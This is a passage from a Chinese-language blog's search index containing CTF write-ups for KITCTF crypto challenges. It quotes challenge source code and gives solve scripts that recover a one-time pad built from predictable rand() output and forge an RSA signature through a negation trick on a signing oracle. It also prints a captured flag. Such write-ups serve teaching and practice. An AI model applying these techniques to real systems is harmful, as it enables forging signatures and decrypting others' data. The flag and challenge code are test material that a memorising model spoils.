<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>kitctf 中的 crypto 題目</title>
      <link href="/kitctf-crypto/"/>
      <url>/kitctf-crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="one-trick-pony"><a class="markdownIt-Anchor" href="#one-trick-pony"></a> One Trick Pony</h3><h4 id="題目"><a class="markdownIt-Anchor" href="#題目"></a> 題目</h4><p>I know a few secrets about this KAsino. But they would not be secrets if a shared them with everybody, so of course I do not share them in plaintext. Good luck getting past my information-theoretic secure encryption.</p><p>This challenge is the first from a set of two challenges.</p><p>nc <a href="http://kitctf.me">kitctf.me</a> 12345</p><h4 id="附件"><a class="markdownIt-Anchor" href="#附件"></a> 附件</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* secret_msg = <span class="string">&quot;&lt;redacted&gt;&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> msg_len = <span class="built_in">strlen</span>(secret_msg);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* random_bytes = <span class="built_in">malloc</span>(msg_len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; msg_len; i++) &#123;</span><br><span class="line">        random_bytes[i] = rand();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* enc = <span class="built_in">malloc</span>(msg_len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; msg_len; i++) &#123;</span><br><span class="line">        enc[i] = secret_msg[i] ^ random_bytes[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is my message to you: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; msg_len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解題思路"><a class="markdownIt-Anchor" href="#解題思路"></a> 解題思路</h4><p>nc <a href="http://kitctf.me">kitctf.me</a> 12345 之後，拿到以下字串。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">33AE0C532293259809A0DBC89A928D235CAB3AD86F8082AD15355C0D56EDE9F207412DC64431D73F053B6461379B3FB6C7D7EDA9FFD0273F2ED61C28521DB1EE17814A8124808E091E7811E2CAAF04FBEA183F4285C048DB46C01C279879A928226D973793C08A71B87D979D76544CE119BCE109BD8F39E4DDEA3CF1EEDFAEC036DC937D</span><br></pre></td></tr></table></figure><p>看似已經沒有其他東西了，但在使用rand();的情況下，我在gcc中測試發現不論版本每次運行中輸出的值都一樣，所以也可以拿到一串字串。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* secret_msg = <span class="string">&quot;&lt;redacted&gt;&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> msg_len = <span class="number">132</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* random_bytes = <span class="built_in">malloc</span>(msg_len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; msg_len; i++) &#123;</span><br><span class="line">        random_bytes[i] = rand();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is my message to you: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; msg_len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, random_bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x67C6697351FF4AEC29CDBAABF2FBE3467CC254F81BE8E78D765A2E63339FC99A66320DB73158A35A255D051758E95ED4ABB2CDC69BB454110E827441213DDC8770E93EA141E1FC673E017E97EADC6B968F385C2AECB03BFB32AF3C54EC18DB5C021AFE43FBFAAA3AFB29D1E6053C7C9475D8BE6189F95CBBA8990F95B1EBF1B305EFF700</span><br></pre></td></tr></table></figure><p>最終就很簡單了，依照 One-time pad 的特性。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>if a or b = c,</mtext><mspace linebreak="newline"></mspace><mtext>then a = b or c, b = a or c</mtext></mrow><annotation encoding="application/x-tex">\text{if a or b = c,} \\\text{then a = b or c, b = a or c}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord text"><span class="mord">if a or b = c,</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord text"><span class="mord">then a = b or c, b = a or c</span></span></span></span></span></span></p><h4 id="解答"><a class="markdownIt-Anchor" href="#解答"></a> 解答</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">a = <span class="number">0x33AE0C532293259809A0DBC89A928D235CAB3AD86F8082AD15355C0D56EDE9F207412DC64431D73F053B6461379B3FB6C7D7EDA9FFD0273F2ED61C28521DB1EE17814A8124808E091E7811E2CAAF04FBEA183F4285C048DB46C01C279879A928226D973793C08A71B87D979D76544CE119BCE109BD8F39E4DDEA3CF1EEDFAEC036DC937D</span></span><br><span class="line">b = <span class="number">0x67C6697351FF4AEC29CDBAABF2FBE3467CC254F81BE8E78D765A2E63339FC99A66320DB73158A35A255D051758E95ED4ABB2CDC69BB454110E827441213DDC8770E93EA141E1FC673E017E97EADC6B968F385C2AECB03BFB32AF3C54EC18DB5C021AFE43FBFAAA3AFB29D1E6053C7C9475D8BE6189F95CBBA8990F95B1EBF1B305EFF700</span></span><br><span class="line">a = long_to_bytes(a)</span><br><span class="line">b = long_to_bytes(b)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">132</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]^b[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="crooked-roulette"><a class="markdownIt-Anchor" href="#crooked-roulette"></a> Crooked Roulette</h3><h4 id="題目-2"><a class="markdownIt-Anchor" href="#題目-2"></a> 題目</h4><p>Your Seatmate is sure to know what you have to bet in the next Round of K-Roulette™. But he does not have the guts to bet it himself. Can you make the bet and win it all?</p><p>nc <a href="http://kitctf.me">kitctf.me</a> 4545</p><h4 id="附件-2"><a class="markdownIt-Anchor" href="#附件-2"></a> 附件</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,getRandomInteger</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;KITCTF&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">while</span> gcd(e, phi) != <span class="number">1</span>:</span><br><span class="line">    e = getPrime(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, d, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c, e, n) == m</span><br><span class="line"></span><br><span class="line">result = getRandomInteger(<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Number of pockets: <span class="subst">&#123;<span class="built_in">hex</span>(n)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The Manager told me, the roulette is crooked and will hit <span class="subst">&#123;<span class="built_in">hex</span>(result)&#125;</span>&quot;</span>)</span><br><span class="line">base = <span class="number">16</span></span><br><span class="line">m2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;What should I bet? &quot;</span>), base)</span><br><span class="line"><span class="keyword">if</span> m2 % n == result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It is too obvious if I bet that&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s2 = sign(m2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;My Signatur is <span class="subst">&#123;<span class="built_in">hex</span>(s2)&#125;</span>&quot;</span>)</span><br><span class="line">    message = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;What do you want to bet? &quot;</span>), base)</span><br><span class="line">    signature = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;Please sign your bet &quot;</span>), base)</span><br><span class="line">    <span class="keyword">if</span> result == message <span class="keyword">and</span> check(signature, message):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;You Win: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You Lose&quot;</span>) </span><br></pre></td></tr></table></figure><h4 id="解題思路-2"><a class="markdownIt-Anchor" href="#解題思路-2"></a> 解題思路</h4><p>這題是我很喜歡的一題，本來弄了一堆做法想要靠數學解都弄不出來，後來想說是不是我想得太複雜了，就慢慢看題目，突然想到應該是可以透過sign(m)這個方程來幫我算解答的。</p><p>後來也證實這題雖然看起來像RSA，但核心完全不一樣。</p><p>但直接代入題目顯示的result，會進到下面此行，從而不能取得flag。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> m2 % n == result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It is too obvious if I bet that&quot;</span>)</span><br></pre></td></tr></table></figure><p>後來我突然想到一個很漂亮的方法，把 n - result 塞進去，拉出來的 sign * -1 + n，就可以還原出真正的 sign，數學上的等價我就不證明了，大致等價於以下。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi mathvariant="normal">′</mi><mo>≡</mo><mo stretchy="false">(</mo><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>m</mi><mtext> mod </mtext><mi>n</mi><mspace linebreak="newline"></mspace><mi>s</mi><mi>i</mi><mi>g</mi><mi>n</mi><mo stretchy="false">(</mo><mi>m</mi><mi mathvariant="normal">′</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>n</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>s</mi><mi>i</mi><mi>g</mi><mi>n</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m′≡(−1)*m\text{ mod }n\\sign(m′)=(n−1)*sign(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord text"><span class="mord"> mod </span></span><span class="mord mathdefault">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord">′</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span></span></p><p>連上nc <a href="http://kitctf.me">kitctf.me</a> 4545之後，得到以下資訊。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Number of pockets: 0x86d14a294d4ecd523e982ab61b40e716b8a78ef12ce3e3367cc29396c45963a0c509c813159e7fa5418dca1e1ec5014e9653448b54ba6daa5aef6314f0d88cc16c5fca79a119b3766319f3e182d817acce98b4b4c296ca89827a8de5c7b91e0570f6abaec565224c6d8f0d93f0b32acc9f34bbb27216249517291bb0b3cd8f7f</span><br><span class="line">The Manager told me, the roulette is crooked and will hit 0x512be59180e3aad84744af1f538316e9c4ead8e2a96f1e3a4b61a5a25a44aa8f</span><br><span class="line">What should I bet? 0x86d14a294d4ecd523e982ab61b40e716b8a78ef12ce3e3367cc29396c45963a0c509c813159e7fa5418dca1e1ec5014e9653448b54ba6daa5aef6314f0d88cc16c5fca79a119b3766319f3e182d817acce98b4b4c296ca89827a8de5c7b91e051fcac61d44817774264a5e749d3013e2da49e2cfc8a7065acbc7760e5988e4f0</span><br><span class="line">My Signatur is 0x6ec031cb61c947db7ee3b1998f7ecc547366f7049eb00ac71f0526ab8b75d0a828d31c92369599c92e3eed640796cd02fb708d051a1407191b2697c87708088ed518d533b1a0b6206272cdedb2075ca905f49d8fe096047368fc807a12fb69effbea54f8a657adb079ac7c031c9ac34a6280ed92c3d7fe8d8aeaf2c0ee0511e0</span><br><span class="line">What do you want to bet? 0x512be59180e3aad84744af1f538316e9c4ead8e2a96f1e3a4b61a5a25a44aa8f</span><br><span class="line">Please sign your bet 0x1811185deb858576bfb4791c8bc21ac2454097ec8e33d86f5dbd6ceb38e392f89c36ab80df08e5dc134edcba172e344b9ae2b7863aa666913fc8cb4c79d084329746f545ef78fd5600a725f3d0d0bb03c8a41724e200c616197e0d6bb4bdb415750c56b61f0d749bf3e29190d41867823cb3ce1fae3e26078c3e28efc5c87d9f</span><br><span class="line">You Win: KITCTF&#123;1nvers4_need_n0_k4y_101492&#125;</span><br></pre></td></tr></table></figure><h4 id="解答-2"><a class="markdownIt-Anchor" href="#解答-2"></a> 解答</h4><p>基本上照著1、2、3的順序填就好。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0x86d14a294d4ecd523e982ab61b40e716b8a78ef12ce3e3367cc29396c45963a0c509c813159e7fa5418dca1e1ec5014e9653448b54ba6daa5aef6314f0d88cc16c5fca79a119b3766319f3e182d817acce98b4b4c296ca89827a8de5c7b91e0570f6abaec565224c6d8f0d93f0b32acc9f34bbb27216249517291bb0b3cd8f7f</span></span><br><span class="line">result = <span class="number">0x512be59180e3aad84744af1f538316e9c4ead8e2a96f1e3a4b61a5a25a44aa8f</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1 : &quot;</span>, <span class="built_in">hex</span>(n - result))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2 : &quot;</span>, result)</span><br><span class="line">sign = <span class="number">0x6ec031cb61c947db7ee3b1998f7ecc547366f7049eb00ac71f0526ab8b75d0a828d31c92369599c92e3eed640796cd02fb708d051a1407191b2697c87708088ed518d533b1a0b6206272cdedb2075ca905f49d8fe096047368fc807a12fb69effbea54f8a657adb079ac7c031c9ac34a6280ed92c3d7fe8d8aeaf2c0ee0511e0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;3:&quot;</span>, <span class="built_in">hex</span>(n - sign))</span><br></pre></td></tr></table></figure><h3 id="optimal-technology-project-未解決"><a class="markdownIt-Anchor" href="#optimal-technology-project-未解決"></a> Optimal Technology Project (未解決)</h3><h4 id="題目-3"><a class="markdownIt-Anchor" href="#題目-3"></a> 題目</h4><p>There are some more secrets. Again, this one is encrypted. And I did not make the same mistake as last time. And I heard everything would be better in rust, so I will use that now.</p><p>This challenge is the second from a set of two challenges. (Due to problems with the third challenge, it won’t be released)</p><h4 id="附件-3"><a class="markdownIt-Anchor" href="#附件-3"></a> 附件</h4><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> rand::&#123;Rng, SeedableRng&#125;;</span><br><span class="line"><span class="keyword">use</span> rand::rngs::StdRng;</span><br><span class="line"><span class="keyword">use</span> std::time::SystemTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mod</span> secret;</span><br><span class="line"><span class="keyword">use</span> crate::secret::&#123;MSG&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> MSG_LEN: <span class="type">usize</span> = MSG.<span class="title function_ invoke__">len</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = SystemTime::<span class="title function_ invoke__">now</span>()</span><br><span class="line">            .<span class="title function_ invoke__">duration_since</span>(SystemTime::UNIX_EPOCH)</span><br><span class="line">            .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Duration since UNIX_EPOCH failed&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">rng</span> = StdRng::<span class="title function_ invoke__">seed_from_u64</span>(t.<span class="title function_ invoke__">as_micros</span>() <span class="keyword">as</span> <span class="type">u64</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">random_bytes</span> = [<span class="number">0u8</span>; MSG_LEN];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">x</span> <span class="keyword">in</span> &amp;<span class="keyword">mut</span> random_bytes &#123;</span><br><span class="line">        *x = rng.gen::&lt;<span class="type">u8</span>&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">flag_bytes</span>  = MSG.<span class="title function_ invoke__">as_bytes</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">enc</span>: <span class="type">Vec</span>&lt;_&gt; = random_bytes.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">zip</span>(flag_bytes).<span class="title function_ invoke__">map</span>(|(x, y)| x ^ y).<span class="title function_ invoke__">collect</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">enc_b64</span> = base64::<span class="title function_ invoke__">encode</span>(enc);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Here is your message: &#123;&#125;&quot;</span>, enc_b64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解題思路-3"><a class="markdownIt-Anchor" href="#解題思路-3"></a> 解題思路</h4><p>這題跟 One Trick Pony 很像，本來以為可以爆開的，但 rust 的 rand 在未定義時，會自動代入 seed = 1970 年以來到現在的毫秒數。</p><p>我後來想到 nc 拿到密文之後，再往前倒推窮舉硬猜系統當下時間，但不知道為什麼失敗了。</p><h3 id="prime-guesser-1"><a class="markdownIt-Anchor" href="#prime-guesser-1"></a> Prime Guesser 1</h3><h4 id="題目-4"><a class="markdownIt-Anchor" href="#題目-4"></a> 題目</h4><p>The Prime Guesser 9000 is a simple game: Guess the prime and win it all. Due to quantum computers, we encrypted the number before handing it to you. Luckily you installed the smartEncrypt™ on your smartphone to encrypt numbers yourself. Win 100 Rounds to receive the big jackpot!</p><p>nc <a href="http://kitctf.me">kitctf.me</a> 4646</p><h4 id="附件-4"><a class="markdownIt-Anchor" href="#附件-4"></a> 附件</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.polynomial <span class="keyword">import</span> polynomial <span class="keyword">as</span> poly</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polymul</span>(<span class="params">x, y, modulus, poly_mod</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(</span><br><span class="line">        np.<span class="built_in">round</span>(poly.polydiv(poly.polymul(x, y) % modulus, poly_mod)[<span class="number">1</span>] % modulus)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polyadd</span>(<span class="params">x, y, modulus, poly_mod</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(</span><br><span class="line">        np.<span class="built_in">round</span>(poly.polydiv(poly.polyadd(x, y) % modulus, poly_mod)[<span class="number">1</span>] % modulus)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_binary_poly</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, <span class="number">2</span>, size, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_uniform_poly</span>(<span class="params">size, modulus</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, modulus, size, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_normal_poly</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.random.normal(<span class="number">0</span>, <span class="number">2</span>, size=size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">size, modulus, poly_mod</span>):</span><br><span class="line">    sk = gen_binary_poly(size)</span><br><span class="line">    a = gen_uniform_poly(size, modulus)</span><br><span class="line">    e = gen_normal_poly(size)</span><br><span class="line">    b = polyadd(polymul(-a, sk, modulus, poly_mod), -e, modulus, poly_mod)</span><br><span class="line">    <span class="keyword">return</span> (b, a), sk</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pk, size, q, t, poly_mod, pt</span>):</span><br><span class="line">    m = np.array([pt] + [<span class="number">0</span>] * (size - <span class="number">1</span>), dtype=np.int64) % t</span><br><span class="line">    delta = q // t</span><br><span class="line">    scaled_m = delta * m  % q</span><br><span class="line">    e1 = gen_normal_poly(size)</span><br><span class="line">    e2 = gen_normal_poly(size)</span><br><span class="line">    u = gen_binary_poly(size)</span><br><span class="line">    ct0 = polyadd(</span><br><span class="line">            polyadd(</span><br><span class="line">                polymul(pk[<span class="number">0</span>], u, q, poly_mod),</span><br><span class="line">                e1, q, poly_mod),</span><br><span class="line">            scaled_m, q, poly_mod</span><br><span class="line">        )</span><br><span class="line">    ct1 = polyadd(</span><br><span class="line">            polymul(pk[<span class="number">1</span>], u, q, poly_mod),</span><br><span class="line">            e2, q, poly_mod</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> (ct0, ct1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">sk, size, q, t, poly_mod, ct</span>):</span><br><span class="line">    scaled_pt = polyadd(</span><br><span class="line">            polymul(ct[<span class="number">1</span>], sk, q, poly_mod),</span><br><span class="line">            ct[<span class="number">0</span>], q, poly_mod</span><br><span class="line">        )</span><br><span class="line">    decrypted_poly = np.<span class="built_in">round</span>(scaled_pt * t / q) % t</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(decrypted_poly[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_factors</span>(<span class="params">number</span>):</span><br><span class="line">    factors = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>]:</span><br><span class="line">        <span class="keyword">if</span> i &gt;= number:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (number % i == <span class="number">0</span>):</span><br><span class="line">            factors.add(i)</span><br><span class="line">            other = number // i</span><br><span class="line">            prime_set = get_factors(other)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(prime_set) == <span class="number">0</span>:</span><br><span class="line">                factors.add(other)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> num <span class="keyword">in</span> prime_set:</span><br><span class="line">                    factors.add(num)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> factors</span><br><span class="line"></span><br><span class="line"><span class="comment"># polynomial modulus degree</span></span><br><span class="line">n = <span class="number">2</span>**<span class="number">6</span> <span class="comment"># EXAMPLE !!! ON THE SERVER ARE OTHER NUMBERS</span></span><br><span class="line"><span class="comment"># ciphertext modulus</span></span><br><span class="line">q = <span class="number">2</span>**<span class="number">20</span> <span class="comment"># EXAMPLE !!! ON THE SERVER ARE OTHER NUMBERS</span></span><br><span class="line"><span class="comment"># plaintext modulus</span></span><br><span class="line">t = <span class="number">2</span>**<span class="number">10</span> <span class="comment"># EXAMPLE !!! ON THE SERVER ARE OTHER NUMBERS</span></span><br><span class="line"><span class="comment"># polynomial modulus</span></span><br><span class="line">poly_mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (n - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line">pk, sk = keygen(n, q, poly_mod)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">c</span>):</span><br><span class="line">    p = decrypt(sk, n, q, t, poly_mod, c)</span><br><span class="line">    <span class="built_in">print</span>(p == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">smart_enrypt</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">if</span> p &gt; <span class="number">0</span> <span class="keyword">and</span> p &lt; <span class="number">25</span>:</span><br><span class="line">        <span class="keyword">return</span> encrypt(pk, n, q, t, poly_mod, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loose</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outputCipher</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(l) + <span class="string">&quot;,&quot;</span> <span class="keyword">for</span> l <span class="keyword">in</span> c[<span class="number">0</span>]])[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(l) + <span class="string">&quot;,&quot;</span> <span class="keyword">for</span> l <span class="keyword">in</span> c[<span class="number">1</span>]])[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span 